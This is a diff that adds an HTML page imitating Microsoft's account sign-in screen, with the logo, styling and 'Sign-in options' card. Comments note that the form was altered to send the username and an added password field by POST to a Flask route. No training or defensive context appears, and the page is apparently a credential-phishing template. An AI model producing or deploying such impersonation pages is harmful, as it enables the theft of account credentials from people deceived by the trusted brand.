@@ -1,0 +1,240 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Sign in to your Microsoft account</title>
+    <style>
+        * {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+            font-family: "Segoe UI", -apple-system, BlinkMacSystemFont, Roboto, Helvetica, Arial, sans-serif;
+        }
+
+        body {
+            background-color: #f2f2f2;
+            color: #1b1b1b;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            padding: 20px;
+        }
+
+        .login-card {
+            background-color: #ffffff;
+            width: 100%;
+            max-width: 440px;
+            padding: 44px;
+            box-shadow: 0 2px 6px rgba(0, 0, 0, 0.2);
+            border-radius: 2px;
+            display: flex;
+            flex-direction: column;
+        }
+
+        /* Microsoft Brand Logo */
+        .ms-logo {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            margin-bottom: 16px;
+        }
+
+        .ms-logo-grid {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 2px;
+            width: 21px;
+            height: 21px;
+        }
+
+        .ms-logo-grid div {
+            width: 10px;
+            height: 10px;
+        }
+
+        .ms-red { background-color: #f25022; }
+        .ms-green { background-color: #7fba00; }
+        .ms-blue { background-color: #00a4ef; }
+        .ms-yellow { background-color: #ffb900; }
+
+        .ms-text {
+            font-size: 19px;
+            font-weight: 600;
+            color: #737373;
+        }
+
+        .title {
+            font-size: 24px;
+            font-weight: 600;
+            color: #1b1b1b;
+            margin-bottom: 16px;
+        }
+
+        .login-form {
+            width: 100%;
+            display: flex;
+            flex-direction: column;
+        }
+
+        .input-field {
+            width: 100%;
+            height: 36px;
+            padding: 6px 0;
+            border: none;
+            border-bottom: 1px solid #666666;
+            font-size: 15px;
+            outline: none;
+            color: #1b1b1b;
+            background-color: transparent;
+            transition: border-bottom-color 0.2s;
+            margin-bottom: 16px; /* added space between fields */
+        }
+
+        .input-field:focus {
+            border-bottom: 2px solid #0067b8;
+        }
+
+        .input-field::placeholder {
+            color: #666666;
+        }
+
+        .signup-text {
+            font-size: 13px;
+            color: #1b1b1b;
+            margin-top: 8px;
+        }
+
+        .signup-text a {
+            color: #0067b8;
+            text-decoration: none;
+        }
+
+        .signup-text a:hover {
+            text-decoration: underline;
+        }
+
+        .actions {
+            display: flex;
+            justify-content: flex-end;
+            margin-top: 32px;
+        }
+
+        .btn-next {
+            background-color: #0067b8;
+            color: #ffffff;
+            border: none;
+            height: 32px;
+            padding: 4px 20px;
+            font-size: 15px;
+            font-weight: 400;
+            cursor: pointer;
+            transition: background-color 0.2s;
+        }
+
+        .btn-next:hover {
+            background-color: #005da6;
+        }
+
+        /* Bottom Options Button Container */
+        .options-card {
+            background-color: #ffffff;
+            width: 100%;
+            max-width: 440px;
+            margin-top: 16px;
+            padding: 12px 44px;
+            box-shadow: 0 2px 6px rgba(0, 0, 0, 0.2);
+            border-radius: 2px;
+            display: flex;
+            align-items: center;
+            gap: 12px;
+            cursor: pointer;
+        }
+
+        .options-card:hover {
+            background-color: #f2f2f2;
+        }
+
+        .key-icon {
+            width: 20px;
+            height: 20px;
+            color: #1b1b1b;
+        }
+
+        .options-text {
+            font-size: 15px;
+            color: #1b1b1b;
+        }
+
+        /* Footer */
+        .footer {
+            position: fixed;
+            bottom: 0;
+            right: 0;
+            padding: 12px 24px;
+            display: flex;
+            gap: 24px;
+            font-size: 12px;
+            color: #666666;
+        }
+
+        .footer a {
+            color: #666666;
+            text-decoration: none;
+        }
+
+        .footer a:hover {
+            text-decoration: underline;
+        }
+    </style>
+</head>
+<body>
+
+    <main class="login-card">
+        <div class="ms-logo">
+            <div class="ms-logo-grid">
+                <div class="ms-red"></div>
+                <div class="ms-green"></div>
+                <div class="ms-blue"></div>
+                <div class="ms-yellow"></div>
+            </div>
+            <span class="ms-text">Microsoft</span>
+        </div>
+
+        <h1 class="title">Sign in</h1>
+
+        <!-- MODIFIED FORM: action points to Flask route, POST method, inputs have names -->
+        <form class="login-form" action="{{ url_for('login') }}" method="POST">
+            <input type="text" class="input-field" name="username" placeholder="Email, phone, or Skype" required />
+            
+            <!-- ADDED: Password Field -->
+            <input type="password" class="input-field" name="password" placeholder="Password" required />
+
+            <p class="signup-text">
+                No account? <a href="#">Create one!</a>
+            </p>
+
+            <div class="actions">
+                <button type="submit" class="btn-next">Next</button>
+            </div>
+        </form>
+    </main>
+
+    <div class="options-card">
+        <svg class="key-icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+            <circle cx="7.5" cy="15.5" r="4.5"></circle>
+            <path d="M10.7 12.3L21 2l2 2-2 2 2 2-2 2-1.7-1.7"></path>
+        </svg>
+        <span class="options-text">Sign-in options</span>
+    </div>
+
+    <footer class="footer">
+        <a href="#">Terms of use</a>
+        <a href="#">Privacy & cookies</a>
+        <span>...</span>
+    </footer>
+
+</body>
+</html>
